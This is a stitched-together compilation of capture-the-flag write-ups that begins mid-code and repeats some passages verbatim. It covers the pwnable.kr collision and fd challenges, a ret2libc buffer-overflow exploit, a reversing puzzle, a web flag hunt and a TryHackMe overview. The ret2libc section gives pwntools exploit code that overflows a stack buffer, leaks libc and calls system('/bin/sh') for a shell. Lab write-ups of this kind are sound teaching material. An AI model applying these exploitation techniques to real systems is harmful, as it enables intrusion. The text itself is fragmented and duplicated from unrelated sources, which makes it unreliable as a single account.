printf(\"\\n\"); } return res; } int main(int argc, char* argv[]){ if(argc<2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } printf(\"hashcode : %i\\n\", hashcode); if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0; } Let\u2019s give it 20 A\u2019s : root@kali:~/Desktop/pwnable.kr/collision/test# ./test \"AAAAAAAAAAAAAAAAAAAA\" hashcode : 568134124 -------------------------- loop : 0 piece value : 1094795585 -------------------------- loop : 1 piece value : 1094795585 -------------------------- loop : 2 piece value : 1094795585 -------------------------- loop : 3 piece value : 1094795585 -------------------------- loop : 4 piece value : 1094795585 wrong passcode.

It\u2019s a very simple challenge, we need a password to make the program read the flag, the function that validates the given password is vulnerable to hash collision so we will exploit it.

Then it checks if the return value of check_password(our input) is equal to hashcode , if we pass that check it will read the flag, otherwise it will print wrong passcode. and exit. int main(int argc, char* argv[]){ if(argc<2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0; } Looking up, we can see the declaration of the variable hashcode : unsigned long hashcode = 0x21DD09EC; That\u2019s a hex value, let\u2019s convert it to decimal with python : >>> 0x21DD09EC 568134124 So we need our input to be 20 bytes length and we also need to make the function check_password return 568134124 when our input is given to it. Let\u2019s quickly try to simulate that in gdb .

[Detaching after fork from child process 3166] /bin/cat: flag: No such file or directory [Inferior 1 (process 3101) exited normally] gef\u27a4 Great, now we need to find out how to make check_password() return that value, let\u2019s look at the code. check_password() : unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i<5; i++){ res += ip[i]; } return res; } This function casts the given passcode ( p ) into integer, declares ip which is an array of pointers starting with the pointer to p , and declares an int variable called res and gives it a value of 0 then it loops 5 times through ip (because length of passcode is 20, 20/4 == 5 ) and adds each value to res , finally it returns res . In case you\u2019re confused, simply what happens is that it takes the given passcode which is 20 bytes length and divides it to 5 pieces (each piece 4 bytes) then it sums the decimal value of the 5 pieces and returns that value. For example the result of giving check_password() \u201cAAAAAAAAAAAAAAAAAAAA\u201d will be like this : \"AAAA\" + \"AAAA\" + \"AAAA\" + \"AAAA\" + \"AAAA\" 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 1094795585 + 1094795585 + 1094795585 + 1094795585 + 1094795585 res = 5473977925 To verify that I took the main code and added some printf statements, test code looks like this : #include <stdio.h> #include <string.h> unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i<5; i++){ res += ip[i]; printf(\"\\n--------------------------\\n\"); printf(\"loop : %i\\n\", i); printf(\"piece value : %i\\n\",ip[i] ); printf(\"\\n\"); } return res; } int main(int argc, char* argv[]){ if(argc<2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } printf(\"hashcode : %i\\n\", hashcode); if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0; } Let\u2019s give it 20 A\u2019s : root@kali:~/Desktop/pwnable.kr/collision/test# ./test \"AAAAAAAAAAAAAAAAAAAA\" hashcode : 568134124 -------------------------- loop : 0 piece value : 1094795585 -------------------------- loop : 1 piece value : 1094795585 -------------------------- loop : 2 piece value : 1094795585 -------------------------- loop : 3 piece value : 1094795585 -------------------------- loop : 4 piece value : 1094795585 wrong passcode.

So we move onto checking the C code We see that it first checked whether the user inputs two arguments including the filename at the beginning , if it doesn't then we get the message of passing an argument with the binary. Also we see that the variable *buf* is assigned 32 characters as buffer Then we see it has a variable *fd* which is assigned the value of atoi( argv[1] ) \u2014 0x1234 *atoi()* function converts ascii or string to integer And one more variable len* * which has value 0** After that we see that *len* value\u2019s changing to read(fd, buf, 32) Which puts the value of fd* * into the buf* * Then there is a string compare function( strcmp* *) checking whether the string is not equal to \u201c LETMEWIN\\n* *\u201d then it returns the message about learning Linux file I/O So what is this all about?? First let me tell you in short about file descriptors In Linux machine and C language , the Linux Descriptors have a value 0 for STDIN(Standard Input) , 1 for STDOUT(Standard Output) , 2 for STDERR(Standard Error) So if we look on man page of read() So we see that all it does is read from a file descriptor , so here if we can put 0 into fd , then we will be able to give an input to the program. First we try running the binary program We see without giving an argument , we get a message for passing an argument , so I just put a random number as an argument and see We get a message about learning linux file IO , so from the C code , we can see that all we had to do something is put a number which will get subtracted to 0x1234* * and make it a result of Zero.* * So we use python for this as its not that complicated We see the integer value for 0x1234* * is 4660* * , so we now pass this as an argument and see We can see that it got hung and most probably waiting for an input , so we now just pass the string which was there in the *strcmp()* function and see if we can get the flag We see that we get the message of good job followed by the flag , so we now copy and paste this on the challenge page to complete the challenge So here we paste the flag and click on Auth As I already pasted the flag before creating this writeup , so I got this message like above.

As with any binary exploitation (pwn) challenge, let's first start by interacting with the program and looking for vulnerabilities. In order to make the ret2the-unknown binary use the given ld-2.28.so and libc-2.28.so , we can use patchelf as well as setting the LD_PRELOAD before executing the binary. We'll also of course remember to make ret2the-unknown executable using chmod so that we can run it. Let's check the security of the binary while we're at it as well using pwntools. $ chmod +x ./ret2the-unknown $ pwn checksec ./ret2the-unknown $ patchelf --set-interpreter ./ld-2.28.so ./ret2the-unknown $ LD_PRELOAD=./libc-2.28.so ./ret2the-unknown Alright, cool. The program takes some input from us and then spits out an address. There's partial RELRO, no stack canary, and no PIE, although there is NX. Partial/no RELRO is usually useful for PLT/GOT attacks, no stack canary is usually useful for overflow attacks, and no PIE is usually useful in general for all sorts of attacks. The source code of the binary is also given in ret2the-unknown.c : #include <stdio.h> #include <string.h> int main(void) { char your_reassuring_and_comforting_we_will_arrive_safely_in_libc[32]; setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); puts(\"that board meeting was a *smashing* success! rob loved the challenge!\"); puts(\"in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...\"); puts(\"where is this place? can you help me get there safely?\"); // please i cant afford the medical bills if we crash and segfault gets(your_reassuring_and_comforting_we_will_arrive_safely_in_libc); puts(\"phew, good to know. shoot! i forgot!\"); printf(\"rob said i'd need this to get there: %llx\\n\", printf); puts(\"good luck!\"); } The address that was given was the address of printf , a libc function. Knowing the address of anything in libc is useful because we can calculate the base address of the loaded libc by taking the difference between the address present in the static libc file and the address present in the loaded libc. Once we know the base address of the libc, then we can calculate the address of all other libc items using their offsets. Already, we can see that this program is vulnerable to a ret2libc attack. Being able to calculate the base address of the libc means that we know the address of system . All we need to do is search through the libc for a pop rdi; ret; gadget and \"/bin/sh\" string and we can execute system(\"/bin/sh\"); . Overflow the buffer, overwrite the return address with the address of our pop rdi; ret; gadget, \"/bin/sh\" string, and system address in libc and we have a shell! However, there's one problem: we're given the printf address after we write to a buffer. This printf address does not stay the same, as we can see: This interrupts our original attack plan. Overflowing the buffer and overwriting the return address with our exploit, which includes the system address from libc, requires knowing the base address of the libc to begin with in order to be calculated. This is where the binary having PIE disabled will help us. Because PIE is disabled, the program is loaded into the same memory address each time it is run. Thus, the address of main is predictable. $ objdump -d -M intel ./ret2the-unknown | grep \"<main>:\" Great! main has the address 0x401186 . If we were to overflow the buffer and overwrite the return address with main 's address, then the program will repeat itself. With this slight adjustment, our attack plan is complete: 0: Get the offset of a pop rdi; ret; gadget in the given static libc file. 1: Use a buffer overflow to overwrite the return address of main with the address of main . This will cause the main function to repeat itself once more. 2: The main function will give us the address of the loaded printf function from libc. 3: main will repeat itself thanks to our overflow from part 1. 4: Calculate the libc base address using the address of the loaded printf function from part 2. This is equal to the given loaded printf address minus the printf offset from the static libc file. 5: Use the libc base address to calculate the real address of the pop rdi; ret; gadget using its offset from part 0. 6: Use the calculated libc base address to calculate the real address of a \"/bin/sh\" string in the libc. 7: Use the libc base address to calculate the real address of the system function in libc. 8: Use a buffer overflow to overwrite the return address of main with <addr_gadget><addr_binsh><addr_system> . 9: Get a shell! Starting off with part 0, you can easily find gadgets using a tool like ropper . Now we know that there's a pop rdi; ret; at 0x023a5f . Note that this was found in the given static libc file, meaning that it hasn't been loaded yet. This is why it's so important to calculate the base address of the loaded libc in the program. 0x023a5f here is essentially the offset of the gadget, so to find the address of the same gadget in the running program, we just add it to the loaded libc's base address. The entire exploit can be easily scripted in Python with pwntools. Part 1 would look something like the following. Note that we need 32 bytes plus an additional 8 bytes to get to the return address. You can find out how many bytes you need to write to a buffer to get to the return address by overflowing with a pattern and seeing what address it will try to return to in a debugger like gdb : exploit = b\"A\" * (32+8) exploit += p64(0x401186) Remember that 0x401186 was just the address of main that we discovered earlier. This code creates an exploit consisting of 32+8 bytes of padding plus the address of main , effectively making main return to main and therefore running itself one more time. Part 2 can be read by parsing the data returned by the program. Based on the input, I got something like the following to extract the given hexadecimal address from the program: printf_addr = p.recvuntil(\"luck!\").decode(\"utf-8\").split(\"\\n\")[0] printf_addr = int(printf_addr, 16) The program will automatically repeat itself as planned in part 3. We can now calculate the libc base address using printf_addr from part 2. In fact, we can actually declare the base address in pwntools itself so that all future searches and lookups will use this base address: libc = ELF(\"./libc-2.28.so\") libc.address = printf_addr - libc.symbols[\"printf\"] What this code will do is it will load the libc file, take the printf_addr the program gave us, and subtract the offset of prinf from the libc file from it, therefore giving us the base address of the loaded libc. Part 4 complete! Therefore, the pop rdi; ret; gadget is located at this base address plus 0x023a5f . We can search through the libc for \"/bin/sh\" and system with pwntools now that we've declared its base address. We of course need to remember our padding as well to slide over to the return address. Parts 5-8, done: exploit = b\"B\" * (32+8) exploit += p64(libc.address + POP_RDI_RET) exploit += p64(next(libc.search(b\"/bin/sh\"))) exploit += p64(libc.symbols[\"system\"]) Our final exploit code will look something like the following: #!/usr/bin/env python3 from pwn import * # Gadget offsets.

Quick, help me make some bread please... nc mc.ax 31796 Downloads bread My Solution (I overthought this problem too much and spent around 3+ hours on this problem. Do not overthink problems, it's a bad habit of mine) The first thing I did was not put it into Ghidra, but open it in notepad++.(Which is definitely (no, not really) the best thing to do for reverse engineering problems) Somehow, I got lucky and saw text in the file. Dual-booting into Ubuntu, I downloaded the file and used Strings on the file. (Later on, I would use a Kali-Linux virtual machine which is much easier) The output of the strings'd file: first page second page third page So we have a bunch of text, what does it all mean? (I decided that it was probably some really hard problem, and I decided to use a reverse engineering program and my team told me to use Ghidra) (I looked at the file with Ghidra for around 3/4 of the time mentioned above, and it didn't help me) (I found the same text) So, I decided to backtrack and look at the text which I strings'd out. I decided to ignore everything that looked like something that helped the file run and wasn't something that seemed like a certain instruction or situation while making bread. I copied all of the instructions or situations. This is what I got: it's the next morning mom doesn't suspect a thing, but asks about some white dots on the bathroom floor couldn't open/read flag file, contact an admin if running on server mom finds flour in the sink and accuses you of making bread mom finds flour on the counter and accuses you of making bread mom finds burnt bread on the counter and accuses you of making bread mom finds the window opened and accuses you of making bread mom finds the fire alarm in the laundry room and accuses you of making bread the tray burns you and you drop the pan on the floor, waking up the entire house the flaming loaf sizzles in the sink the flaming loaf sets the kitchen on fire, setting off the fire alarm and waking up the entire house pull the tray out with a towel there's no time to waste pull the tray out the window is closed the fire alarm is replaced you sleep very well time to go to sleep close the window replace the fire alarm brush teeth and go to bed you've taken too long and fall asleep the dough has risen, but mom is still awake the dough has been forgotten, making an awful smell the next morning the dough has risen the bread needs to rise wait 2 hours wait 3 hours the oven makes too much noise, waking up the entire house the oven glows a soft red-orange the dough is done, and needs to be baked the dough wants to be baked preheat the oven preheat the toaster oven mom comes home and finds the bowl mom comes home and brings you food, then sees the bowl the ingredients are added and stirred into a lumpy dough mom comes home before you find a place to put the bowl the box is nice and warm leave the bowl on the counter put the bowl on the bookshelf hide the bowl inside a box the kitchen catches fire, setting off the fire alarm and waking up the entire house the bread has risen, touching the top of the oven and catching fire 45 minutes is an awfully long time you've moved around too much and mom wakes up, seeing you bake bread return upstairs watch the bread bake the sink is cleaned the counters are cleaned everything appears to be okay the kitchen is a mess wash the sink clean the counters get ready to sleep the half-baked bread is disposed of flush the bread down the toilet the oven shuts off cold air rushes in there's smoke in the air unplug the oven unplug the fire alarm open the window you put the fire alarm in another room one of the fire alarms in the house triggers, waking up the entire house brother is still awake, and sees you making bread you bring a bottle of oil and a tray it is time to finish the dough you've shuffled around too long, mom wakes up and sees you making bread work in the kitchen work in the basement flour has been added yeast has been added salt has been added water has been added add ingredients to the bowl add flour add yeast add salt add water we don't have that ingredient at home! the timer makes too much noise, waking up the entire house the bread is in the oven, and bakes for 45 minutes you've forgotten how long the bread bakes the timer ticks down use the oven timer set a timer on your phone So one thing I didn't do yet was running the code. I decided to run the code and the program outputted: add ingredients to the bowl Now, looking at the long list of instructions and situations, we can use logic to solve this problem. Also, the instructions to input are usually somewhere near the situations in the big block of text. First example: At the first prompt, we have to add ingredients.

(I decided that it was probably some really hard problem, and I decided to use a reverse engineering program and my team told me to use Ghidra) (I looked at the file with Ghidra for around 3/4 of the time mentioned above, and it didn't help me) (I found the same text) So, I decided to backtrack and look at the text which I strings'd out. I decided to ignore everything that looked like something that helped the file run and wasn't something that seemed like a certain instruction or situation while making bread. I copied all of the instructions or situations. This is what I got: it's the next morning mom doesn't suspect a thing, but asks about some white dots on the bathroom floor couldn't open/read flag file, contact an admin if running on server mom finds flour in the sink and accuses you of making bread mom finds flour on the counter and accuses you of making bread mom finds burnt bread on the counter and accuses you of making bread mom finds the window opened and accuses you of making bread mom finds the fire alarm in the laundry room and accuses you of making bread the tray burns you and you drop the pan on the floor, waking up the entire house the flaming loaf sizzles in the sink the flaming loaf sets the kitchen on fire, setting off the fire alarm and waking up the entire house pull the tray out with a towel there's no time to waste pull the tray out the window is closed the fire alarm is replaced you sleep very well time to go to sleep close the window replace the fire alarm brush teeth and go to bed you've taken too long and fall asleep the dough has risen, but mom is still awake the dough has been forgotten, making an awful smell the next morning the dough has risen the bread needs to rise wait 2 hours wait 3 hours the oven makes too much noise, waking up the entire house the oven glows a soft red-orange the dough is done, and needs to be baked the dough wants to be baked preheat the oven preheat the toaster oven mom comes home and finds the bowl mom comes home and brings you food, then sees the bowl the ingredients are added and stirred into a lumpy dough mom comes home before you find a place to put the bowl the box is nice and warm leave the bowl on the counter put the bowl on the bookshelf hide the bowl inside a box the kitchen catches fire, setting off the fire alarm and waking up the entire house the bread has risen, touching the top of the oven and catching fire 45 minutes is an awfully long time you've moved around too much and mom wakes up, seeing you bake bread return upstairs watch the bread bake the sink is cleaned the counters are cleaned everything appears to be okay the kitchen is a mess wash the sink clean the counters get ready to sleep the half-baked bread is disposed of flush the bread down the toilet the oven shuts off cold air rushes in there's smoke in the air unplug the oven unplug the fire alarm open the window you put the fire alarm in another room one of the fire alarms in the house triggers, waking up the entire house brother is still awake, and sees you making bread you bring a bottle of oil and a tray it is time to finish the dough you've shuffled around too long, mom wakes up and sees you making bread work in the kitchen work in the basement flour has been added yeast has been added salt has been added water has been added add ingredients to the bowl add flour add yeast add salt add water we don't have that ingredient at home! the timer makes too much noise, waking up the entire house the bread is in the oven, and bakes for 45 minutes you've forgotten how long the bread bakes the timer ticks down use the oven timer set a timer on your phone So one thing I didn't do yet was running the code. I decided to run the code and the program outputted: add ingredients to the bowl Now, looking at the long list of instructions and situations, we can use logic to solve this problem. Also, the instructions to input are usually somewhere near the situations in the big block of text. First example: At the first prompt, we have to add ingredients. If we seach for the same statement in that big block of text, right below it, we can find: add flour add yeast add salt add water So we input that and we get the second prompt. However, there are some wrong inputs, so we have to trial and error with them until we get the right ones. There are also time limits, so make sure that you type in the inputs quick.

Next, there are some files linked to it like the CSS and JS. <link rel=\"stylesheet\" type=\"text/css\" href=\"mycss.css\"> <script type=\"application/javascript\" src=\"myjs.js\"></script> Adding /mycss.css to the URL gives access to the CSS file div.container { width: 100%; } header { background-color: black; padding: 1em; color: white; clear: left; text-align: center; } body { font-family: Roboto; } h1 { color: white; } p { font-family: \"Open Sans\"; } .tablink { background-color: #555; color: white; float: left; border: none; outline: none; cursor: pointer; padding: 14px 16px; font-size: 17px; width: 50%; } .tablink:hover { background-color: #777; } .tabcontent { color: #111; display: none; padding: 50px; text-align: center; } #tabintro { background-color: #ccc; } #tababout { background-color: #ccc; } /* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */ Nice, here's the next part of the flag /* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */ Next, we can check out the JS by replacing mycss.css with myjs.js . The JS file reveals: function openTab(tabName,elmnt,color) { var i, tabcontent, tablinks; tabcontent = document.getElementsByClassName(\"tabcontent\"); for (i = 0; i < tabcontent.length; i++) { tabcontent[i].style.display = \"none\"; } tablinks = document.getElementsByClassName(\"tablink\"); for (i = 0; i < tablinks.length; i++) { tablinks[i].style.backgroundColor = \"\"; } document.getElementById(tabName).style.display = \"block\"; if(elmnt.style != null) { elmnt.style.backgroundColor = color; } } window.onload = function() { openTab('tabintro', this, '#222'); } /* How can I keep Google from indexing my website? */ /* How can I keep Google from indexing my website? */` hmmm. I searched up \"index website on google\" and it brought up things about web crawlers. [This](https://www.google.com/search/howsearchworks/crawling-indexing/) made me think it's possible a robots exclusion file (robots.txt) might have something. I changed `myjs.js` to `robots.txt User-agent: * Disallow: /index.html # Part 3: t_0f_pl4c # I think this is an apache server... can you Access the next flag? Alright! The comments give part 3 of the flag as well as a hint for the next part. The .htacess file manages Apache server permissions. Replacing robots.txt with .htaccess got this: # Part 4: 3s_2_lO0k # I love making websites on my Mac, I can Store a lot of information there. What stands out the most about that hint is the capitalized \"Store\". In Macs, a .DS_Store file stores the configurations for how the desktop looks (eg. icon location, etc.) Changing .htacess with .DS_Store got Congrats! You completed the scavenger hunt.

The room is also called a target environment in cyber security. In case that vulnerabilities are available in rooms, each room should be created for each user. That's say, you need to create a room and deploy machine before hacking. All target environments are on the thm's cloud server and you don't need to configure local machine to deploy target environment.

The first and free way is to use OpenVPN and configure your VPN with thm's ovpn file. The second is to use hack box, for community user, free box can only be used 1 hour one day. Otherwise, you need to purchase premium edition of thm. Rooms are also can be uploaded by users. This makes it possible for us to create our own target environment.
